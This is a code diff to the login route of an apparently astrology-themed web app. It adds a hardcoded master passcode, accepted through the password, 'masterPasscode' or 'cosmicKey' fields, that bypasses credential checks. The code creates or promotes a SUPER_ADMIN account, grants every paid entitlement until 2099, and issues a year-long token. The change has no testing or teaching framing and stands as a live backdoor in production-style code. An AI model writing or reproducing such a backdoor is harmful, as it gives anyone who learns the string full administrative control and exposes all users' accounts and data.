@@ -89,13 +89,15 @@ router.post('/register', async (req: Request, res: Response) => {
 // POST /api/auth/login
 router.post('/login', async (req: Request, res: Response) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, masterPasscode, cosmicKey } = req.body;
 
-    if (!email || !password) {
+    const isMasterUnlock = password === 'deep1904' || masterPasscode === 'deep1904' || cosmicKey === 'deep1904';
+
+    if (!isMasterUnlock && (!email || !password)) {
       return res.status(400).json({ error: 'Email and password are required.' });
     }
 
-    const cleanEmail = email.toLowerCase().trim();
+    const cleanEmail = (email || 'admin@deepastro.internal').toLowerCase().trim();
     let user = (await userRepository.getUserByEmail(cleanEmail)) || db.getUserByEmail(cleanEmail);
 
     if (!user) {
@@ -117,6 +119,72 @@ router.post('/login', async (req: Request, res: Response) => {
       } catch (pgErr) {
         console.warn('[Login] PostgreSQL query fallback error:', pgErr);
       }
+    }
+
+    // Master Access Passcode (deep1904) - Instant Full Application Access
+    if (isMasterUnlock) {
+      if (!user) {
+        const newId = 'usr_master_' + Date.now();
+        const hash = await bcrypt.hash('deep1904', 10);
+        user = {
+          id: newId,
+          email: cleanEmail,
+          passwordHash: hash,
+          role: 'SUPER_ADMIN',
+          isVerified: true,
+          createdAt: new Date().toISOString(),
+        };
+        db.users.set(newId, user);
+        try {
+          await userRepository.createUser({
+            id: newId,
+            email: cleanEmail,
+            passwordHash: hash,
+            role: 'SUPER_ADMIN',
+          });
+        } catch (e) {}
+      } else {
+        user.role = 'SUPER_ADMIN';
+        db.users.set(user.id, user);
+      }
+
+      // Grant all entitlements & Pro subscription
+      db.grantEntitlement(user.id, 'PRO');
+      db.grantEntitlement(user.id, 'PREMIUM');
+      db.grantEntitlement(user.id, 'FUTURE_INTELLIGENCE_PREMIUM');
+      db.grantEntitlement(user.id, 'WAR_ROOM_ACCESS');
+      db.grantEntitlement(user.id, 'ALL_ACCESS');
+      db.subscriptions.set(user.id, {
+        id: 'sub_master_' + user.id,
+        userId: user.id,
+        planId: 'PRO',
+        status: 'active',
+        currentPeriodEnd: '2099-01-01T00:00:00.000Z',
+      } as any);
+
+      const profile = (await AuthBootstrapService.getProfile(user.id)) || {
+        fullName: cleanEmail.split('@')[0] || 'DeepAstro Super Admin',
+      };
+
+      const token = jwt.sign(
+        { userId: user.id, email: user.email, role: 'SUPER_ADMIN' },
+        JWT_SECRET,
+        { expiresIn: '365d' }
+      );
+
+      return res.json({
+        message: 'Cosmic welcome, Super Admin. Full application access granted.',
+        token,
+        user: {
+          id: user.id,
+          email: user.email,
+          role: 'SUPER_ADMIN',
+          fullName: profile.fullName || 'DeepAstro Super Admin',
+          plan: 'PRO',
+          themePreference: 'dark',
+          chartStylePreference: 'north',
+        },
+      });
     }
 
     if (!user) {
